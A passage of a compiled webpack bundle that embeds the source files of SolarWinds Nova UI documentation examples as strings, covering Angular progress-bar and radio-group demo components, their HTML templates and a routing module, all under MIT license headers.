LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport { ProgressExampleComponent } from "./progress-docs/progress-docs.example.component";\nexport { BasicProgressExampleComponent } from "./basic-progress/basic-progress.example.component";\nexport { StackedHeaderProgressExampleComponent } from "./stacked-header/stacked-header.example.component";\nexport { IndeterminateProgressExampleComponent } from "./indeterminate-progress/indeterminate-progress.example.component";\nexport { ProgressVisualTestComponent } from "./progress-visual-test/progress-visual-test.component";\nexport { ProgressTestComponent } from "./progress-test/progress-test.component";\nexport { ProgressCompactExampleComponent } from "./progress-compact/progress-compact.example.component";\nexport { ProgressWithHelpTemplateExampleComponent } from "./progress-with-help-template/progress-with-help-template-example.component";\n'},41390:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-progress [show]="show" compactMode="true"> </nui-progress>\n\n<button\n    nui-button\n    class="mt-1"\n    type="button"\n    (click)="toggleProgress()"\n    displayStyle="primary"\n    i18n\n>\n    Start/stop progress\n</button>\n'},87882:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-progress-compact-example",\n    templateUrl: "./progress-compact.example.component.html",\n})\nexport class ProgressCompactExampleComponent {\n    public show = false;\n\n    public toggleProgress(): void {\n        this.show = !this.show;\n    }\n}\n'},43986:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiProgressModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    In order to use progress component, you need to pass <code>show</code>,\n    <code>percent</code> and <code>message</code> bindings.\n</p>\n\n<nui-example-wrapper filenamePrefix="basic-progress" exampleTitle="Basic Usage">\n    <nui-basic-progress-example></nui-basic-progress-example>\n</nui-example-wrapper>\n\n<h2>Stacked Header</h2>\n\n<p>\n    Progress header could be placed on the left side. You need to pass\n    <code>stacked</code> as true for that. Progress percents could be shown by\n    using <code>showNumber</code> as true. Progress could be canceled by passing\n    <code>allowCancel</code> as true and <code>cancelProgress</code> function.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="stacked-header"\n    exampleTitle="Stacked Header"\n>\n    <nui-stacked-header-example></nui-stacked-header-example>\n</nui-example-wrapper>\n\n<h2>Indeterminate</h2>\n\n<p>\n    In case <code>percent</code> was not passed, indeterminate progress will be\n    used.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="indeterminate-progress"\n    exampleTitle="Indeterminate"\n>\n    <nui-indeterminate-progress-example></nui-indeterminate-progress-example>\n</nui-example-wrapper>\n\n<h2>Compact</h2>\n\n<p>\n    To hide all elements from Progress, except for progress bar, and to remove\n    all margins from progress bar set\n    <code>compactMode</code> to true.\n</p>\n\n<nui-example-wrapper filenamePrefix="progress-compact" exampleTitle="Compact">\n    <nui-progress-compact-example></nui-progress-compact-example>\n</nui-example-wrapper>\n\n<h2>Custom Help Template</h2>\n\n<p>\n    In order to customize the help content that appears below the progress bar,\n    you can pass a template via the <code>helpTemplateRef</code> input.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    When the <code>helpTemplateRef</code> input is used, there\'s no need to pass\n    a value to the <code>helpText</code> input.\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="progress-with-help-template"\n    exampleTitle="Custom Help Template"\n>\n    <nui-progress-with-help-template-example></nui-progress-with-help-template-example>\n</nui-example-wrapper>\n'},63054:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-progress-docs-example",\n    templateUrl: "./progress-docs.example.component.html",\n})\nexport class ProgressExampleComponent {}\n'},40618:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <nui-indeterminate-progress-example></nui-indeterminate-progress-example>\n    <hr />\n    <nui-progress-compact-example\n        id="nui-demo-compact-progress"\n    ></nui-progress-compact-example>\n</div>\n'},31414:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-progress-test",\n    templateUrl: "./progress-test.component.html",\n})\nexport class ProgressTestComponent {\n    public show = false;\n    public percent = 50;\n    public isCanceled = false;\n\n    public startProgress(): void {\n        this.show = true;\n    }\n\n    public toggleProgress(): void {\n        this.show = !this.show;\n    }\n\n    public onCancel(): void {\n        this.isCanceled = true;\n        this.show = false;\n        this.percent = 0;\n    }\n}\n'},99094:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Basic Popover</h3>\n    <nui-progress\n        id="nui-demo-basic-progress"\n        message="Task Label"\n        helpText="Optional description"\n        [show]="show"\n        [percent]="percent"\n    >\n    </nui-progress>\n\n    <button\n        id="nui-demo-start-basic-progress"\n        style="margin-top: 15px"\n        nui-button\n        type="button"\n        (click)="startProgress()"\n        displayStyle="primary"\n    >\n        Start progress\n    </button>\n    <hr />\n\n    <h3>Popover with stacked header and progress percentage</h3>\n    <nui-progress\n        id="nui-demo-stacked-header"\n        [show]="show"\n        [stacked]="true"\n        [percent]="percent"\n        [showNumber]="true"\n        [allowCancel]="true"\n        message="Task Label"\n        helpText="Optional description"\n        (cancel)="onCancel()"\n    >\n    </nui-progress>\n    <hr />\n\n    <h3>Indeterminate Popover</h3>\n    <nui-progress\n        id="nui-demo-indeterminate-progress"\n        [show]="show"\n        [allowCancel]="true"\n        message="Task Label"\n        helpText="Optional description"\n        (cancel)="onCancel()"\n    >\n    </nui-progress>\n    <hr />\n</div>\n'},19842:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-progress-visual-test",\n    templateUrl: "./progress-visual-test.component.html",\n})\nexport class ProgressVisualTestComponent {\n    public show = false;\n    public percent = 50;\n    public isCanceled = false;\n\n    public startProgress(): void {\n        this.show = true;\n    }\n\n    public onCancel(): void {\n        this.isCanceled = true;\n        this.show = false;\n        this.percent = 0;\n    }\n}\n'},38845:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-progress\n    id="nui-demo-basic-progress"\n    i18n-message\n    message="Task Label"\n    [show]="show"\n    [helpTemplateRef]="helpTemplate"\n    [percent]="percent"\n>\n</nui-progress>\n<ng-template #helpTemplate>\n    <span i18n>\n        It is a long established fact that a reader will be distracted by the\n        readable content of a page when looking at its layout. The point of\n        using Lorem Ipsum is that it has a more-or-less normal distribution of\n        letters, as opposed to using \'Content here, content here\', making it\n        look like readable English.\n    </span>\n</ng-template>\n<button\n    nui-button\n    class="mt-1"\n    type="button"\n    (click)="toggleProgress()"\n    displayStyle="primary"\n    i18n\n>\n    Start/stop progress\n</button>\n'},15593:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-progress-with-help-template-example",\n    templateUrl: "./progress-with-help-template-example.component.html",\n})\nexport class ProgressWithHelpTemplateExampleComponent implements OnDestroy {\n    public show = false;\n    public percent = 0;\n    private intervalId?: NodeJS.Timeout;\n\n    public toggleProgress(): void {\n        this.show = !this.show;\n\n        if (!this.show) {\n            this.clearInterval();\n            this.percent = 0;\n        } else {\n            this.intervalId = setInterval(() => {\n                if (this.percent < 100) {\n                    this.percent += 10;\n                } else {\n                    this.clearInterval();\n                    this.show = false;\n                }\n            }, 1000);\n        }\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.intervalId) {\n            clearInterval(this.intervalId);\n            this.intervalId = undefined;\n        }\n    }\n}\n'},22479:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiProgressModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    BasicProgressExampleComponent,\n    IndeterminateProgressExampleComponent,\n    ProgressCompactExampleComponent,\n    ProgressExampleComponent,\n    ProgressVisualTestComponent,\n    ProgressTestComponent,\n    ProgressWithHelpTemplateExampleComponent,\n    StackedHeaderProgressExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ProgressExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "progress-visual-test",\n        component: ProgressVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "progress-test",\n        component: ProgressTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiProgressModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        BasicProgressExampleComponent,\n        IndeterminateProgressExampleComponent,\n        ProgressCompactExampleComponent,\n        ProgressExampleComponent,\n        ProgressVisualTestComponent,\n        ProgressTestComponent,\n        ProgressWithHelpTemplateExampleComponent,\n        StackedHeaderProgressExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("progress"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ProgressModule {}\n'},25726:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-progress\n    id="nui-demo-stacked-header"\n    [show]="show"\n    [stacked]="true"\n    [percent]="percent"\n    [showNumber]="true"\n    [allowCancel]="true"\n    i18n-message\n    message="Task Label"\n    i18n-helpText\n    helpText="Optional description"\n    (cancel)="onCancel()"\n>\n</nui-progress>\n\n<button\n    id="nui-demo-stacked-header-btn"\n    nui-button\n    class="mt-1"\n    type="button"\n    (click)="startProgress()"\n    displayStyle="primary"\n    i18n\n>\n    Start progress\n</button>\n'},98426:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-stacked-header-example",\n    templateUrl: "./stacked-header.example.component.html",\n})\nexport class StackedHeaderProgressExampleComponent implements OnDestroy {\n    public show = false;\n    public percent = 0;\n    public isCanceled = false;\n    private stop: any = undefined;\n\n    public startProgress(): void {\n        this.clearInterval();\n\n        this.show = true;\n        this.stop = setInterval(() => {\n            if (this.percent < 100) {\n                this.percent += 10;\n            } else {\n                this.onCancel();\n            }\n        }, 1000);\n    }\n\n    public onCancel(): void {\n        this.clearInterval();\n        this.isCanceled = true;\n        this.show = false;\n        this.stop = undefined;\n        this.percent = 0;\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.stop) {\n            clearInterval(this.stop);\n        }\n    }\n}\n'},6458:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1 i18n>Selected fruit: {{ selectedFruit }}</h1>\n<nui-radio-group name="fruit" [(value)]="selectedFruit">\n    <nui-radio\n        *ngFor="let fruit of fruits"\n        [value]="fruit"\n        [checked]="fruit === \'Orange\'"\n    >\n        {{ fruit }}\n    </nui-radio>\n</nui-radio-group>\n'},63846:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-basic-radio-group-example",\n    templateUrl: "./basic-radio-group.example.component.html",\n})\nexport class BasicRadioGroupExampleComponent {\n    public fruits = [\n        $localize`Banana`,\n        $localize`Orange`,\n        $localize`Kiwi`,\n        $localize`Papaya`,\n    ];\n    public selectedFruit: string;\n\n    constructor() {}\n}\n'},60640:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1 i18n>Selected fruit: {{ selectedFruit }}</h1>\n<nui-radio-group id="fruit-radio-group" name="fruit" [(value)]="selectedFruit">\n    <nui-radio\n        *ngFor="let fruit of fruits"\n        [value]="fruit"\n        [checked]="fruit === \'Orange\'"\n        [disabled]="fruit === \'Banana\'"\n    >\n        {{ fruit }}\n    </nui-radio>\n</nui-radio-group>\n'},24448:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-disabled-radio-group-example",\n    templateUrl: "./disabled-radio-group.example.component.html",\n})\nexport class DisabledRadioGroupExampleComponent {\n    public fruits = [\n        $localize`Banana`,\n        $localize`Orange`,\n        $localize`Kiwi`,\n        $localize`Papaya`,\n    ];\n    public selectedFruit: string;\n\n    constructor() {}\n}\n'},12440:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./radio-group-docs/radio-group-docs.example.component";\nexport * from "./basic-radio-group/basic-radio-group.example.component";\nexport * from "./disabled-radio-group/disabled-radio-group.example.component";\nexport * from "./radio-group-with-hints/radio-group-hints.example.component";\nexport * from "./radio-group-with-hints-content/radio-group-hints-content.example.component";\nexport * from "./value-change-radio-group/value-change-radio-group.example.component";\nexport * from "./radio-group-inline/radio-group-inline.example.component";\nexport * from "./radio-group-visual-test/radio-group-visual-test.component";\nexport * from "./radio-group-in-form/radio-group-in-form.example.component";\nexport * from "./radio-group-test/radio-group-test.component";\n'},85590:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-radio-group&gt;</code> is used to get and store value of\n    selected <code>&lt;nui-radio&gt;</code>\n    buttons. Radio buttons allow users to choose one option from a set of\n    mutually exclusive options. The user must select only one option, never\n    zero.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiRadioModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To implement a radio group you need to pass a variable to\n    <code>[(value)]</code> where you want to store the selected radio button.\n    Then just add <code>&lt;nui-radio&gt;</code> with\n    <code>[value]</code> property inside <code>&lt;nui-radio-group&gt;</code>.\n    Also you can preselect value of <code>&lt;nui-radio&gt;</code> using\n    <code>[checked]</code> property.\n</p>\n<nui-example-wrapper\n    filenamePrefix="basic-radio-group"\n    exampleTitle="Basic usage"\n>\n    <nui-basic-radio-group-example></nui-basic-radio-group-example>\n</nui-example-wrapper>\n\n<h2>Inline</h2>\n<p>\n    Add <code>class="nui-radio-group-inline"</code> to\n    <code>&lt;nui-radio-group&gt;</code>\n    to display radio group inline.\n</p>\n<nui-example-wrapper filenamePrefix="radio-group-inline" exampleTitle="Inline">\n    <nui-radio-group-inline-example></nui-radio-group-inline-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>\n    To disable a radio button inside radio group you need to pass\n    <code>[disabled]</code> property to the <code>&lt;nui-radio&gt;</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="disabled-radio-group"\n    exampleTitle="Disabled"\n>\n    <nui-disabled-radio-group-example></nui-disabled-radio-group-example>\n</nui-example-wrapper>\n\n<h2>Hints</h2>\n<p>\n    If you want to have hints below the radio buttons then you need to pass\n    <code>[hint]</code> property to the <code>&lt;nui-radio&gt;</code>.\n</p>\n<nui-example-wrapper filenamePrefix="radio-group-hints" exampleTitle="Hints">\n    <nui-with-hints-radio-group-example></nui-with-hints-radio-group-example>\n</nui-example-wrapper>\n<p>Or use some content element with <code>hint</code> attribute.</p>\n<nui-example-wrapper\n    filenamePrefix="radio-group-hints-content"\n    exampleTitle="Elaborate Hints"\n>\n    <nui-with-hints-content-radio-group-example></nui-with-hints-content-radio-group-example>\n</nui-example-wrapper>\n<h2>Value Change Event</h2>\n<p>\n    You can pass <code>(valueChange)</code> property to the\n    <code>&lt;nui-radio-group&gt;</code> and do something when the value of\n    radio group changes.\n</p>\n<nui-example-wrapper\n    filenamePrefix="value-change-radio-group"\n    exampleTitle="Value change event"\n>\n    <nui-value-change-radio-group-example></nui-value-change-radio-group-example>\n</nui-example-wrapper>\n\n<h2>Part Of Form</h2>\n<p><code>&lt;nui-radio-group&gt;</code> can be used in reactive forms.</p>\n<nui-example-wrapper\n    filenamePrefix="radio-group-in-form"\n    exampleTitle="In form"\n>\n    <nui-radio-group-in-form-example></nui-radio-group-in-form-example>\n</nui-example-wrapper>\n'},45493:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF 